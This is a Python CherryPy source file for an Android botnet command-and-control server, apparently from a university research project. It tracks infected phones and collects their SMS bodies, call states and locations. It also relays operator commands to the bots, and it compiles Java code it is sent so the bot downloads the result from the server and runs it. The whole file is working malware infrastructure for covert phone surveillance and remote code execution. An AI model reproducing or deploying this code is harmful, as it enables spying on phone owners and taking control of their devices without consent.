#!/usr/bin/env python
from __future__ import with_statement
import sys
import cherrypy
from cherrypy import tools
from cherrypy import request
import os
import socket
import subprocess
import random
import six
from time import gmtime, strftime
from glob import glob
import json
from jinja2 import Template
from collections import OrderedDict
from grizzled.os import working_directory
from datetime import datetime
import common

from subprocess import check_output

from yuv420sp import yuvtoimg

try:
    import psyco
    psyco.full()
except ImportError:
    pass

cherrypy.config.update({"server.socket_port": 9884, "server.socket_host": "0.0.0.0"})

CLIENTTIMEFMT = "%a, %d %b %Y %H:%M:%S +0000"
enc="UTF-8"

class BotnetServer(object):

    def __init__(self, uicommchannel ):
      self.version=1;
      self.uicommchannel = uicommchannel;
      self.statuses = {}

    def getactive(self):
      for (k,phone) in self.statuses.iteritems():
        if phone.status:
          yield phone
    def getcommands(self, serial):
      return self.statuses[serial].servercommands

    @cherrypy.expose
    def getmap(self, la, lo):
      #cherrypy.response.headers['Content-Type'] = 'text/javascript'
      template = Template(open("static/maptemplate.jinja2").read())
      return template.render(la=la, lo=lo)

    @cherrypy.expose
    def updatestatus(self, serial, status, model, port, servercommands):
      knowyou = True
      try: self.statuses[str(serial)]
      except KeyError:
        knowyou = False
        self.statuses[str(serial)] = common.Phone(str(model), status=="on", int(port), request.remote.ip, json.loads(servercommands), str(serial), common.VideoStatus.NOTSENDING)
       
      p = self.statuses[str(serial)]
      self.uicommchannel(common.phoneStatusUpdate(p))
      self.uicommchannel(common.commandListUpdate(p))
      return "ok, " + ("already know you" if knowyou else "don't know you")

    @cherrypy.expose
    @tools.json_in()
    @tools.json_out()
    def setupforwarding(self):

        def getfreeport():
          s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
          s.bind(("127.0.0.1",0))
          return s.getsockname()[1]

        def extractsecondmsg(s):
          for i in range(0,2):
            lastchar="";
            out=""
            while True:
              buf = s.recv(1)
              out += buf
              if (lastchar in ["O","K"] and buf in ["O","K"]):
                t = s.recv(1)
                while t != "\n":
                  out += t
                  t = s.recv(1)
                break
              lastchar = buf
            
          return out

        try: 
          host = "127.0.0.1"
          s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
          s.connect((host, 5554))
          newport = getfreeport()
          p = self.statuses[request.json["serial"]]
          s.send(six.b("redir add tcp:" + str(newport) + ":" + str(p.port) +"\n"))
          p.port = newport
          sec = extractsecondmsg(s)
          if not sec.startswith("OK"): raise Exception(sec)
          s.close()
          return {"type": "success", "data": newport}
        except Exception as e:
          return {"type": "error", "data": e.message}

    @cherrypy.expose
    @tools.json_in()
    @tools.json_out()
    def executecode(self):
     def jsonmayfail(jsono):
       try:
         return json.loads(jsono)
       except ValueError:
         return jsono
     def subst(org):
       return org.replace("__VERSION__", str(self.version))
     def formatoutput(output):
       time = strftime(CLIENTTIMEFMT, gmtime())
       return {"output": output, "time": time}

     output = []
     with working_directory("jwork"):

      self.version += 1;

      realclassname = subst(request.json["classname"])

      cleanup = []
      for f in glob("de/tudarmstadt/botnet/janus_yanai/*") + ["class.jar","dexed.jar","../static/dexed.jar"]:
        try:
          os.remove(f)
        except OSError as e:
          cleanup.append([e.filename, e.strerror])
      if cleanup != []: output.append({"cleanup": cleanup})

      try:
        f = open("de/tudarmstadt/botnet/janus_yanai/" + realclassname + ".java", 'w')
        f.write(subst(request.json["code"]))
        f.close()
      except OSError as e:
        output.append({"write code to file": str(e)})
        return formatoutput(output)

      compileanddex = OrderedDict()
      try:
#        for i in ["javac -cp  ~/Desktop/android-sdk-linux_x86/platforms/android-10/android.jar de/tudarmstadt/botnet/janus_yanai/*", "jar cf class.jar de", "~/Desktop/android-sdk-linux_x86/platform-tools/dx --dex --output dexed.jar class.jar"]:
        for i in ["javac -cp  ~/Downloads/android-sdk-linux/platforms/android-10/android.jar de/tudarmstadt/botnet/janus_yanai/*", "jar cf class.jar de", "~/Downloads/android-sdk-linux/platform-tools/dx --dex --output dexed.jar class.jar"]:
          o = six.u(check_output(i, stderr=subprocess.STDOUT, shell=True))
          if o != "":
            compileanddex.update(i, o)
      except subprocess.CalledProcessError as e:
        output.append({"compile and dex": compileanddex})
        output.append({"stdout": e.output})
        output.append({"error": str(e)})
        return formatoutput(output)
      if compileanddex != {}: output.append({"compile and dex": compileanddex})

      os.symlink(os.path.join(os.getcwd(), "dexed.jar"), "../static/dexed.jar")
      ip = self.statuses[request.json["serial"]].ip
      port = self.statuses[request.json["serial"]].port
      if ip == "127.0.0.1":
        myip = "10.0.2.2"
      else:
        myip = six.u(check_output("ifconfig")).split("\n")[1].split()[1][5:]
      st = self.sendbotcmd(ip, port, "download http://" + myip + ":" + str(cherrypy.config["server.socket_port"]) + "/static/dexed.jar")
      output.append({"downloading": jsonmayfail(st)})
      if (st == "timed out"):
        return formatoutput(output)
      st = self.sendbotcmd(ip, port, "run de.tudarmstadt.botnet.janus_yanai." + realclassname)
      output.append({"running": jsonmayfail(st)})
      return formatoutput(output)

    @cherrypy.expose
    @tools.json_in()
    @tools.json_out()
    def executecommand(self):
        output = self.sendbotcmd(self.statuses[request.json["serial"]].ip, self.statuses[request.json["serial"]].port, request.json["command"])
        time = strftime(CLIENTTIMEFMT, gmtime())
        try:
          out = json.loads(output)
        except ValueError as e:
          out = {"type": "text", "data": e.message + "\nInput was: " + output}
        return {"output": out, "time": time}


    def sendbotcmd(self, host, port, command):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        output = ""
        try:
          s.settimeout(10.0)
          s.connect((host, int(port)))
          s.send(six.b(command + "\n"))
          done = False
          while not done:
            bs = s.recv(256)
            if bs.find("\0") != -1:
              response, garbage = bs.split("\0", 1)
              bs = response
              done = True
            output += bs
        except socket.error as e:
          output += "\n" + str(e)
        s.close()
        return output

    @cherrypy.expose
    def location(self, serial, location):
      obj = json.loads(location)
      if "time" in obj:
        obj["time"] = datetime.fromtimestamp(float(obj["time"])/1000).strftime(CLIENTTIMEFMT)
      self.uicommchannel(json.dumps(["location", obj, serial]))
      return "ok received"
    @cherrypy.expose
    def sms(self, body, serial):
        self.uicommchannel(json.dumps(["sms", {"body": body}, serial]))
        return "ok received"
    @cherrypy.expose
    def phone(self, state, serial, number="n/a"):
        self.uicommchannel(json.dumps(["phone", {"state": state, "number": number}, serial]))
        return "ok received"
#    @cherrypy.expose
#    def img(self, data, width, height):
#      f = open("/tmp/f1.yuv","w")
#      f.write(base64.b64decode(data))
#      f.close()
#      cherrypy.log(str([width, height]))
#      return "ok received"
    

if __name__ == "__main__":
  STATIC_DIR = os.path.join(os.path.abspath("."), "static")

  config = {'/static':
                {'tools.staticdir.on': True,
                 'tools.staticdir.dir': STATIC_DIR,
                }
         }

  from wsserver import WSRoot, UIWSHandler

  wsroot = WSRoot()
  botnetserver = BotnetServer(UIWSHandler.sendall)
  wsroot.botnetserver = botnetserver
  cherrypy.tree.mount(wsroot, "/ws", config={})
  cherrypy.tree.mount(botnetserver, "/", config=config)

  cherrypy.engine.start()
  cherrypy.engine.block()
